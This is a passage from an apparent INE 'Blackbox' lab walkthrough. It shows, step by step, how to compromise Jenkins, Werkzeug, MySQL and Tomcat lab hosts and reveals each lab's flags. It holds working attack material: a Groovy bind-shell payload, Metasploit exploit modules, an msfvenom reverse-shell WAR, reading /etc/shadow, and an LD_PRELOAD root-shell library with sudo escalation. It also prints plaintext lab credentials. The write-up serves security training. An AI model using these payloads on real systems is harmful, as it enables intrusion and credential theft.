+<p><img alt="" src="../media/Blackbox%20lab%20INE_66.png" /></p>
+<p>Notice that we have received a meterpreter session! This will aid us to proceed with the exploitation.</p>
+<p>Step 17: Checking the list of interfaces on the compromised target machine.</p>
+<p>Command:</p>
+<p>ifconfig</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_67.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_68.png" /></p>
+<p>Notice that there are 2 interfaces (excluding the loopback interface) namely:eth0andeth1. And one of those is in the same network as the Kali machine. The other one is in another network.</p>
+<p>Step 18: Using the meterpreter session to serve as a socks proxy.</p>
+<p>As mentioned in the challenge description, the second machine to be exploited is accessible via the first machine (that is, ).</p>
+<p>Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!</p>
+<p>Background the meterpreter session and check the meterpreter session identifier:</p>
+<p>Command:</p>
+<p>bg</p>
+<p>sessions</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_69.png" /></p>
+<p>Now add a route to the network accessible only via the first target machine at .</p>
+<p>Command:</p>
+<p>route add 192.108.156.0/24 1</p>
+<p>The last argument to the above command is the identifier of the meterpreter shell session.</p>
+<p>Now let's use thesocks_proxyauxiliary module to convert the meterpreter session to serve as a socks proxy:</p>
+<p>Commands:</p>
+<p>use auxiliary/server/socks_proxy</p>
+<p>set VERSION 4a</p>
+<p>set SRVPORT 9050</p>
+<p>run -j</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_70.png" /></p>
+<p>After the above commands, a socks proxy server (having version 4a) would be started on port 9050. It would be started as a background process (since we used the-jflag).</p>
+<p>Now anything we sent over port 9050 would be sent over to the network we added to the route (that is,192.108.156.0/24).</p>
+<p>Step 19: Scanning the second target machine using the proxychains tool.</p>
+<p>Let's scan the second target machine (present in the network of the first compromised machine).</p>
+<p>We will use proxychains to do the job. By default, proxychains makes use of port9050and that's the reason we configured the socks proxy server to listen on that port!</p>
+<p>Command:</p>
+<p>proxychains nmap -sT -P0 192.108.156.3</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_71.png" /></p>
+<p>The above command would scan the second target machine using nmap. Since it's not directly reachable we have used proxychains tool, which would make use of the proxy server we started, using the meterpreter session to the compromised target machine (at ).</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_72.png" /></p>
+<p>Notice that port8080is open on the second target machine.</p>
+<p>Step 20: Configuring the browser to use the socks proxy server.</p>
+<p>Let's try and access the service on port 8080 on the second target machine via browser. For that we have to configure the browser to make use of the socks proxy server that we started in Step 18.</p>
+<p>Go to browser preferences:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_73.png" /></p>
+<p>Search for proxy keyword and select the Network Settings from the returned results:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_74.png" /></p>
+<p>Now configure the browser to use socks proxy as shown in the following image:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_75.png" /></p>
+<p>Step 21: Accessing the automation server on the second target machine.</p>
+<p>Now since everything is configured, we can access the service running on port 8080 on the second target machine in the browser itself.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_76.png" /></p>
+<p>It's Jenkins web UI!</p>
+<p>Important Note: The socks proxy server over meterpreter is quite unstable and it might get disconnected before you completely exploit the second machine. So you might have to gain back the meterpreter shell session on the first target machine (located at ) and set the proxy server again, in case the meterpreter session dies.</p>
+<p>Click on Manage Jenkins link on the left panel:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_77.png" /></p>
+<p>Scroll down on Manage Jenkins page:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_78.png" /></p>
+<p>Click on Script Console section:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_79.png" /></p>
+<p>That should open the Groovy Script console:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_80.png" /></p>
+<p>Here we can execute arbitrary scripts and get a shell session! But since we are connected to the Jenkins instance over the socks proxy, we need to start a bind shell on that server and connect to it. The reverse shell won't work since that machine (on which Jenkins is running) doesn't know how to reach back to the Kali instance (which is located in a different network).</p>
+<p>Let's do that next.</p>
+<p>Step 22: Gaining a shell session on the second target machine (running Jenkins).</p>
+<p>Paste the following Groovy bind shell payload in the script console and click on the Run button to execute the payload:</p>
+<p>Groovy bind shell payload:</p>
+<p>int port=5555;</p>
+<p>String cmd="/bin/bash";</p>
+<p>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()</p>
+<p>Socket s = new java.net.ServerSocket(port).accept()</p>
+<p>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();</p>
+<p>OutputStream po=p.getOutputStream(),so=s.getOutputStream();</p>
+<p>while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_81.png" /></p>
+<p>Payload Reference:</p>
+<p>Once the payload has been executed in the Groovy script console, we can use netcat utility to connect to the bind shell started on the target machine (running Jenkins) using proxychains:</p>
+<p>Command:</p>
+<p>proxychains nc -v 192.108.156.3 5555</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_82.png" /></p>
+<p>And that should connect us to the target machine running Jenkins!</p>
+<p>Step 23: Gathering information about the target machine running Jenkins.</p>
+<p>Now we can issue some commands to find out more information about the user we are operating as and the target server machine:</p>
+<p>Command:</p>
+<p>id</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_83.png" /></p>
+<p>We are currently running asjenkinsuser.</p>
+<p>Let's get the listing of files:</p>
+<p>Command:</p>
+<p>ls</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_84.png" /></p>
+<p>Let's get the process listing:</p>
+<p>Command:</p>
+<p>ps aux</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_85.png" /></p>
+<p>As you can see we can issue commands on the Jenkins server as well.</p>
+<p>And this completes our objective of compromising both machines and gaining shell access on them!</p>
+<p>BLACKBOX 3</p>
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_86.png" /></p>
+<p>Step 2: Check if the provided machines/domains are reachable.</p>
+<p>Commands:</p>
+<p>ping -c 2 server1.ine.local</p>
+<p>ping -c 2 server2.ine.local</p>
+<p>ping -c 2 server3.ine.local</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_87.png" /></p>
+<p>The provided machines are reachable, and we also found their IP addresses.</p>
+<p>Step 3: Scan the network to discover the services running on them.</p>
+<p>Now let's find all the services on the provided target machines:</p>
+<p>Command:</p>
+<p>nmap -sV --script=banner 192.73.96.0/24</p>
+<p>The above command would fingerprint the services and provide their version information as well since we have used the-sVflag.</p>
+<p>--script=banneris an Nmap script that will connect to an open TCP port and print out anything that is sent by the service within five seconds. That's that service banner.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_88.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_89.png" /></p>
+<p>We can observe that there are three machines in the subnet excluding the provided Kali instance and gateway.</p>
+<pre><code>   -  The first machine, having IP192.73.96.3is running the Werkzeug httpd service,
+   -  The second machine, having IP192.73.96.4is running the MySQL server, and
+   -  The third machine, having IP192.73.96.5is running OpenSSH and Apache Tomcat server.
+</code></pre>
+<p>Note: The IP addresses would be different in your case, so make sure you use the correct IP address, otherwise the commands might not give the expected results!</p>
+<p>After running the Nmap banner script we would know the names and the versions of the services on all the provided machines.</p>
+<p>And since we know of all the details now, we will begin with the exploitation part.</p>
+<p>Let's first target theWerkzeug httpd 0.9.6service i.e .</p>
+<p>Step 4: Exploiting Werkzeug httpd service.</p>
+<p>We already know the version of Werkzeug. So let's use that information to search for any publicly available exploits using searchsploit.</p>
+<p>Information: : searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go. SearchSploit gives you the power to perform detailed off-line searches through your locally checked-out copy of the repository. This capability is particularly useful for security assessments on segregated or air-gapped networks without Internet access.</p>
+<p>So using searchsploit, one can quickly look for exploits from the copy of the Exploit Database available offline on your machine (Kali instance in this case). Let's look for exploits available for werkzeug:</p>
+<p>Command:</p>
+<p>searchsploit werkzeug</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_90.png" /></p>
+<p>We can notice that there is a Metasploit module for werkzeug. But we need to make sure that this exploit works against Werkzeug version 0.9.6.</p>
+<p>The suggested ruby exploit is located at/usr/share/exploitdb/exploits/python/remote/37814.rb.</p>
+<p>Inspect this file to determine if the current version of werkzeug is vulnerable to the "Debug Shell" command execution or not:</p>
+<p>Command:</p>
+<p>cat /usr/share/exploitdb/exploits/python/remote/37814.rb</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_91.png" /></p>
+<p>As you can clearly see, Werkzeug version 0.9.6 is vulnerable to command execution.</p>
+<p>Now that we have identified the running application and discovered the vulnerability, we will exploit it next.</p>
+<p>Step 5: Searching for Werkzeug exploit modules in the Metasploit Framework.</p>
+<p>Start Metasploit framework and search for werkzeug exploit modules:</p>
+<p>Commands:</p>
+<p>msfconsole -q</p>
+<p>search werkzeug</p>
+<p>The above set of commands would start metasploit in quiet mode (that is, we won't get a big banner) and then look for werkzeug related exploit modules.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_92.png" /></p>
+<p>Notice that there is a Metasploit module for Werkzeug. We will use this for exploitation in the subsequent steps.</p>
+<p>Step 6: Checkingwerkzeug_debug_rcemodule options.</p>
+<p>Let's use the identified werkzeug module:exploit/multi/http/werkzeug_debug_rceand list the options that we need to configure for this module.</p>
+<p>Commands:</p>
+<p>use exploit/multi/http/werkzeug_debug_rce</p>
+<p>show options</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_93.png" /></p>
+<p>The following options are to be set:</p>
+<pre><code>   -  RHOSTS: It's the IP or URL of the target machine. In our case, it's , where the werkzeug service is running.
+   -  PORT: is set to 80 by default, for this module. Since the service is running on port 80 on the target machine, nothing needs to be done.
+   -  PAYLOAD: Set it topython/meterpreter/reverse_tcpto get back the meterpreter shell session.
+   -  LHOST: Set it to the IP address of the host machine (the Kali GUI instance), where we expect to receive back the meterpreter shell session, that is,192.73.96.2. But this IP might be different in your case, so make sure you set it properly. Otherwise the exploit won't work!
+   -  LPORT: Set it to a port where we expect to receive back the meterpreter shell session. Let's keep it at it's default value.
+</code></pre>
+<p>Now that we know of all the options and the values we need to fill in, let's do that next.</p>
+<p>Step 7: Configuring the selected werkzeug module and exploiting the application.</p>
+<p>Use the following commands to configure the module and exploit the werkzeug application:</p>
+<p>Commands:</p>
+<p>set RHOSTS 192.73.96.3</p>
+<p>set LHOST 192.73.96.2</p>
+<p>check</p>
+<p>exploit</p>
+<p>Thecheckcommand would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it. And theexploitcommand would exploit the service, provided that it's vulnerable.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_94.png" /></p>
+<p>Notice that the werkzeug application has been successfully exploited and we have received back a meterpreter shell.</p>
+<p>Let's check the privilege of the meterpreter shell session:</p>
+<p>Command:</p>
+<p>getuid</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_95.png" /></p>
+<p>As shown in the above output, we have root user privileges!</p>
+<p>Now that we have gained a shell session on the target machine, the very first thing would be to look for the existing users, sensitive files/data like hardcoded credentials, etc. We can use popular scripts like LinEnum to quickly identify all possible information related to users and system configurations. This will greatly speed up the process and reduce the manual work that we need to otherwise perform.</p>
+<p>We will choose to go with the manual route to show you the complete process but you can use LinEnum as well. It's already available in the Kali GUI instance.</p>
+<p>Step 8: Checking available users on the target machine.</p>
+<p>Since we are root, we can check the contents of/etc/shadowfile and find the list of all the users, their home directories and even their password hashes:</p>
+<p>Command:</p>
+<p>cat /etc/shadow</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_96.png" /></p>
+<p>A total of seven users are present on the target machine.</p>
+<p>We could now check their home directory to find interesting files or alternatively leverage interesting modules such aspost/linux/gather/enum_users_history.</p>
+<p>Step 9: Using theenum_users_historyMetasploit post exploit module to find the user's history file.</p>
+<p>Let's use the Linux user shell history enumeration module to find and dump the user's history.</p>
+<p>Information: When a user enters any command in the terminal, by default it gets logged in the.bash_historyfile in the user's home directory. And that's one of the things that this module can retrieve for us!</p>
+<p>As mentioned in the  description: Theenum_users_historymodule gathers user specific information. User list, bash history, mysql history, vim history, lastlog and sudoers.</p>
+<p>Now let's background the meterpreter session and run theenum_users_historymodule:</p>
+<p>Commands:</p>
+<p>background</p>
+<p>use post/linux/gather/enum_users_history</p>
+<p>set SESSION 1</p>
+<p>run</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_97.png" /></p>
+<p>Notice that the shell history for the user auditor is available. The contents of that file have been downloaded to the Kali instance in the file:/root/.msf4/loot/20211117160325_default_192.73.96.3_linux.enum.users_287331.txt</p>
+<p>Step 10: Hunting for sensitive information in the auditor user's bash history file.</p>
+<p>Command:</p>
+<p>cat /root/.msf4/loot/20211117160325_default_192.73.96.3_linux.enum.users_287331.txt</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_98.png" /></p>
+<p>The auditor user had accessed a MySQL database server using CLI and the credentials were supplied to the command which were thus stored in the.bash_historyfile, in plain-text.</p>
+<p>As if you remember, on  machine, MySQL server was running. And it's IP address was192.73.96.4! So we supposedly got the credentials to access the MySQL server.</p>
+<p>Let's try connecting to that MySQL server instance next.</p>
+<p>Step 11: Connecting to the MySQL server using discovered credentials.</p>
+<p>Use the following command to connect to the MySQL server instance running on :</p>
+<p>Command:</p>
+<p>mysql -h server2.ine.local -u root -pfArFLP29UySm4bZj</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_99.png" /></p>
+<p>That worked! We have received back a MySQL shell session where we can access (and even tamper with) all the data present on this database server!</p>
+<p>Let's list all the databases and see if anything interesting is present on this server:</p>
+<p>Command:</p>
+<p>show databases;</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_100.png" /></p>
+<p>All the three databases present are the default databases of MySQL server.</p>
+<p>So there's nothing of much value here. But there's one thing we can do - we can try to exploit this database server and probably get shell access on that machine.</p>
+<p>Let's try doing that next.</p>
+<p>Step 12: Checking for MySQL exploit modules in the Metasploit Framework.</p>
+<p>Let's switch back to the Metasploit Framework tab in the terminal and look for the available MySQL exploit modules:</p>
+<p>Command:</p>
+<p>search mysql</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_101.png" /></p>
+<p>Notice that there is a Metasploit module available to exploit the MySQL database server. i.eexploit/multi/mysql/mysql_udf_payload</p>
+<p>It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.</p>
+<p>Step 13: Checking the available options for the MySQL UDF exploit module.</p>
+<p>Let's use the listed MySQL UDF module and check it's available options:</p>
+<p>Commands:</p>
+<p>use exploit/multi/mysql/mysql_udf_payload</p>
+<p>show options</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_102.png" /></p>
+<p>The following options are to be set:</p>
+<pre><code>   -  FORCE_UDF_UPLOAD: Since we wish to execute commands on the remote server, we will set this option to true in order to install asys_exec()MySQL function.
+   -  RHOSTS: It's the IP or URL of the target machine. In our case, it's , where the MySQL server is running.
+   -  RPORT: It's the port of the MySQL service on the remote machine. Since MySQL service is running on the default port of 3306, nothing needs to be changed here.
+   -  USERNAME: It's the username to be used for the MySQL server login. It is already set to the value we want, that is, root.
+   -  PASSWORD: It's the password to be used for the MySQL server login. Since we retrieved the credentials for root user, we just need to set it to that value:fArFLP29UySm4bZj
+</code></pre>
+<p>We also need to configure the payload options and the exploit target for this module:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_103.png" /></p>
+<p>Here we need to set the following options:</p>
+<pre><code>   -  LHOST: Set it to the IP address of the host machine (the Kali GUI instance), where we expect to receive back the meterpreter shell session, that is,192.73.96.2. But this IP might be different in your case, so make sure you set it properly. Otherwise the exploit won't work!
+   -  LPORT: Set it to a port where we expect to receive back the meterpreter shell session. Let's keep it at it's default value.
+</code></pre>
+<p>For the Exploit target, which defaults to Windows (numbered as 0), we need to change it to Linux (numbered as 1).</p>
+<p>Now that we know of all the options and the values we need to fill in, let's do that next.</p>
+<p>Step 14: Configuring the selected MySQL UDF exploit module and exploiting the target.</p>
+<p>Let's set all the options as discussed in the previous step:</p>
+<p>Commands:</p>
+<p>set FORCE_UDF_UPLOAD true</p>
+<p>set PASSWORD fArFLP29UySm4bZj</p>
+<p>set RHOSTS server2.ine.local</p>
+<p>set TARGET 1</p>
+<p>set LHOST 192.73.96.2</p>
+<p>exploit</p>
+<p>session -i 2</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_104.png" /></p>
+<p>Note: Again emphasising the point that the IP address for theLHOSTmust not be copied as is but instead it must be retrieved from the Kali instance that you receive. Otherwise things won't work as expected.</p>
+<p>Ignore the error received while exploiting the MySQL server.</p>
+<p>Let's check the available meterpreter sessions:</p>
+<p>Command:</p>
+<p>sessions</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_105.png" /></p>
+<p>Notice that we received back a new meterpreter session. Let's access that shell (it's indexed as 2 in the above image):</p>
+<p>Command:</p>
+<p>sessions -i 2</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_106.png" /></p>
+<p>And we have received back a meterpreter shell on the target running MySQL server! So the exploitation was successful.</p>
+<p>Step 15: Reading the flag from the compromised MySQL server.</p>
+<p>Commands:</p>
+<p>ls /root</p>
+<p>cat /root/flag.txt</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_107.png" /></p>
+<p>FLAG: 4c537c0dfd18bafdcd59f53c7015550e</p>
+<p>And with that, we have successfully exploited two machines and found one flag. Now, only one machine remains to be exploited, and that's located at .</p>
+<p>Step 16: Accessing the last target machine (located at ) in a web browser.</p>
+<p>We already know that on the last target machine: , OpenSSH and Apache Tomcat services are running.</p>
+<p>Open Firefox browser and access the Tomcat server on port 8080:</p>
+<p>URL</p>
+<p><a href="http://server3.ine.local:8080">http://server3.ine.local:8080</a></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_108.png" /></p>
+<p>As you can notice, only one image is loaded on this page. Nothing else seems to be present on the home page.</p>
+<p>Step 17: Enumerating all the files and directories on the Tomcat server using dirb tool.</p>
+<p>Let's use dirb to perform directory enumeration against the Tomcat server on :</p>
+<p>Command:</p>
+<p>dirb http://server3.ine.local:8080</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_109.png" /></p>
+<p>As you can notice in the output above, some interesting (and sensitive) paths have been discovered like/manager.</p>
+<p>Let's access the/managerin the browser:</p>
+<p>URL:</p>
+<p><a href="http://server3.ine.local:8080/manager">http://server3.ine.local:8080/manager</a></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_110.png" /></p>
+<p>Once the page loads up, it requests credentials to access the protected page. If you take a closer look at the dialog box, it says: "Tomcat Manager Application".</p>
+<p>That definitely seems interesting! Let's try to exploit this in the next steps.</p>
+<p>Step 18: Using tomcat manager login Metasploit module.</p>
+<p>Switch back to the terminal running Metasploit Framework and use the tomcat manager login module, that is,auxiliary/scanner/http/tomcat_mgr_login:</p>
+<p>Commands:</p>
+<p>use auxiliary/scanner/http/tomcat_mgr_login</p>
+<p>show options</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_111.png" /></p>
+<p>Theshow optionscommand would list all the available configurable options for the selected module.</p>
+<p>As you can notice most of the options are set to sane defaults. The only option we need to set isRHOSTS. We will also turn off the verbosity by setting theVERBOSEoption to false.</p>
+<p>Use the following commands to set the RHOSTS to the target URL, that is,  and turn off the verbosity:</p>
+<p>Commands:</p>
+<p>set RHOSTS server3.ine.local</p>
+<p>set VERBOSE false</p>
+<p>exploit</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_112.png" /></p>
+<p>The last commandexploitwould, you guessed it, exploit the target Tomcat server.</p>
+<p>Notice that we got back the valid credentials to access the Tomcat manager application!</p>
+<p>Step 19: Access Tomcat Manager Application interface.</p>
+<p>Let's access the/managerresource using the credentials recovered in the previous step:</p>
+<p>Username: tomcat Password: s3cret</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_113.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_114.png" /></p>
+<p>And we have successfully logged in!</p>
+<p>Scroll down to the Deploy section. In the WAR file to deploy subsection, we will upload a malicious WAR file to compromise the target server.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_115.png" /></p>
+<p>Step 20: Generating a malicious WAR file and deploying it to the target server.</p>
+<p>We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server.</p>
+<p>Use the following commands (withLHOSTset to the IP of your Kali instance):</p>
+<p>Commands:</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war &gt; shell.war</p>
+<p>file shell.war</p>
+<p>Here's the summary of the flags used with msfvenom:</p>
+<pre><code>   -  -p: To specify a payload, which we have set to a JSP reverse TCP shell
+   -  LHOST: To specify the IP address/URL of the attacker machine, that's the Kali instance in our case
+   -  LPORT: The port on the attacker machine on which the listener must be started to receive back the shell session
+   -  -f: To specify the output format, which we have set to war
+</code></pre>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_116.png" /></p>
+<p>The generated file is saved to the file named shell.war.</p>
+<p>Now we just need to upload it to the Tomcat server and deploy it:</p>
+<p>Switch to the browser window and then click on the Browse... button:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_117.png" /></p>
+<p>Now locate and select the shell.war file:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_118.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_119.png" /></p>
+<p>After selecting the file, click on the Deploy button:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_120.png" /></p>
+<p>Once the WAR file is deployed successfully, we should be able to see it in the application list:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_121.png" /></p>
+<p>As you can see in the above screenshot, we have successfully deployed the shell.war application.</p>
+<p>Step 21: Starting a netcat listener on the Kali GUI instance.</p>
+<p>Before we access the deployed shell application, we need to start the netcat listener to receive a reverse shell.</p>
+<p>Note: Make sure that the port on which the netcat listener is started is the same one we used in the payload (theLPORTparameter) generated using the msfvenom command.</p>
+<p>So let's start a netcat listener on port 443:</p>
+<p>Command:</p>
+<p>nc -lvp 443</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_122.png" /></p>
+<p>Now access the shell application using the browser and we should have received a reverse shell on the netcat listener:</p>
+<p>Application Path</p>
+<p><a href="http://server3.ine.local:8080/shell/">http://server3.ine.local:8080/shell/</a></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_123.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_124.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_125.png" /></p>
+<p>We have received a shell and we are operating as thetomcatuser.</p>
+<p>Step 22: Spawning a TTY shell.</p>
+<p>The current shell is not a standard shell as it lacks quite a lot of benefits that a TTY shell provides like reverse search, tab completion, etc. So let's upgrade the current shell session using Python:</p>
+<p>Command:</p>
+<p>python -c 'import pty;pty.spawn("/bin/bash");'</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_126.png" /></p>
+<p>Now we have a TTY shell.</p>
+<p>Step 23: Reading the flag from the compromised Tomcat server.</p>
+<p>Commands:</p>
+<p>ls</p>
+<p>cat FLAG1</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_127.png" /></p>
+<p>FLAG: EBCFE35ACC27E0EA91CF3A5AB600BABE</p>
+<p>Step 24: Checking sensitive system files like/etc/shadow.</p>
+<p>Since we are running as tomcat user, we definitely won't have the privileges to modify any sensitive data on the system. But let's see if we have the privilege to read the/etc/shadowfile:</p>
+<p>Command:</p>
+<p>ls -l /etc/shadow</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_128.png" /></p>
+<p>Information: In the/etc/shadowfile the password hashes for all the user's are present. And that's why it's one of the files that pentesters love!</p>
+<p>As you can notice from the above output, we have read permission on this file.</p>
+<p>Let's read this file:</p>
+<p>Command:</p>
+<p>cat /etc/shadow</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_129.png" /></p>
+<p>All users present in this file are the default accounts except for robert. At this point, we have 2 options:</p>
+<pre><code>   -  Crack the hash and recover the password, or
+   -  Enumerate further to find other ways to gain root privilege
+</code></pre>
+<p>Feel free to try both approaches. Since both are independent, you can even try your luck with both.</p>
+<p>Since cracking the hash is the least fun and no-brainer part, we will instead focus on enumerating the machine further to give you more insights on the areas to look at during a pentest.</p>
+<p>Step 25: Exploring Tomcat configuration files for secrets.</p>
+<p>Let's explore Tomcat's conf folder where all the webserver configuration files are present:</p>
+<p>Commands:</p>
+<p>cd conf</p>
+<p>ls</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_130.png" /></p>
+<p>Notice that there is a gzipped archive present in the conf folder. Let's extract it's contents and see if it contains anything interesting:</p>
+<p>Command:</p>
+<p>tar -xvf conf.tar.gz</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_131.png" /></p>
+<p>Notice that it's the complete backup of the Tomcat webserver's conf folder. Let's check the contents ofconf/tomcat-users.xmlfile:</p>
+<p>Command:</p>
+<p>cat conf/tomcat-users.xml</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_132.png" /></p>
+<p>Interestingly enough, we have discovered password for the user robert here:robert@1234567890!@#</p>
+<p>By the complexity of the password, you can probably guess that it would be quite difficult to break via bruteforce attempts!</p>
+<p>Step 26: Login to the Tomcat server over SSH.</p>
+<p>If you remember on the Tomcat server machine, that is, , OpenSSH service was also running. So we can try the credentials of user robert to access the machine over SSH.</p>
+<p>Alternatively, we can use thesucommand to switch to robert's account.</p>
+<p>Feel free to choose whatever option you like. We will use SSH to gain access to the target machine:</p>
+<p>Command:</p>
+<p>ssh robert@server3.ine.local</p>
+<p>Type yes and then enter the credentials for robert credentials.</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_133.png" /></p>
+<p>And that should give us the access to robert's account.</p>
+<p>Command:</p>
+<p>id</p>
+<p>We can confirm that by using theidcommand.</p>
+<p>Now since we are logged in as robert, let's look for the flag and read the flag file:</p>
+<p>Commands:</p>
+<p>ls</p>
+<p>cat FLAG2</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_134.png" /></p>
+<p>FLAG: EC2986081E84BB845541D5CC0BEE13B3</p>
+<p>Step 27: Generating privilege escalation payload.</p>
+<p>Now that we have access to robert's account, let's see if we can elevate our privileges to root. For that, let's check the list of privileges of robert:</p>
+<p>Command:</p>
+<p>sudo -l</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_135.png" /></p>
+<p>Notice that theLD_PRELOADenvironment variable is set in the above output. Also, robert user can executelscommand withsudo(as root) without requiring a password.</p>
+<p>By leveraging theLD_PRELOADenvironment variable, we will forcelscommand to first load a custom shared library which provides shell access on the target machine.</p>
+<p>Add to that the fact that robert's account can use thelscommand withsudowithout any password. This will help us we will take advantage of this to run our malicious library and gain the root shell!</p>
+<p>We will be compiling the following code as a shared library and preloading it while running thelscommand:</p>
+<p>Code:</p>
+<h1>include <stdio.h></h1>
+<h1>include <sys/types.h></h1>
+<h1>include <stdlib.h></h1>
+<p>void _init() {</p>
+<p>unsetenv("LD_PRELOAD");</p>
+<p>setgid(0);</p>
+<p>setuid(0);</p>
+<p>system("/bin/sh");</p>
+<p>}</p>
+<p>The above code is simple enough. It sets the user id and group id to 0 (that's for the root user!) and spawns a bash shell. And that would end up giving us a root shell on the target machine.</p>
+<p>The function is named_initand that's important, otherwise your exploit code won't work. The reason is that the_initfunction runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*.</p>
+<p>*Note: The above statement is not entirely true._initfunction is obsolete and__attribute__((constructor))is the preferred way for writing the code that runs to perform any initializations. You can read more on it .</p>
+<p>Save the above code asshell.c:</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_136.png" /></p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_137.png" /></p>
+<p>Now let's compile the code to generate a shared library,shared.so:</p>
+<p>Commands:</p>
+<p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</p>
+<p>file shell.so</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_138.png" /></p>
+<p>Note: If you chose to go with the__attribute__((constructor))route instead of using the_init, which is obsolete (and dangerous) way of doing things, then while generating the shared library,-nostartfiles'' or-nostdlib'' flags must not be used!</p>
+<p>Once the above commands have been executed, we would have successfully generated the malicious shared library.</p>
+<p>Step 28: Performing privilege escalation attacks using theLD_PRELOADenvironment variable.</p>
+<p>Now we have everything set up in order to carry out a privilege escalation attack. We will runlscommand withsudoand set theLD_PRELOADenvironment variable to the path of the malicious shared library we just compiled in the previous step:</p>
+<p>Commands:</p>
+<p>id</p>
+<p>sudo LD_PRELOAD=/home/robert/shell.so ls</p>
+<p>id</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_139.png" /></p>
+<p>And as you can see, we have gained a root shell!</p>
+<p>Step 29: Reading the flag.</p>
+<p>Now let's read the last flag:</p>
+<p>Commands:</p>
+<p>ls /root</p>
+<p>cat /root/FLAG3</p>
+<p><img alt="" src="../media/Blackbox%20lab%20INE_140.png" /></p>
+<p>FLAG: 560648FC63F090A8CF776326DC13FAC7</p>
+<p>And this completes our objective of compromising all 3 machines and retrieving all the flags from them!</p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
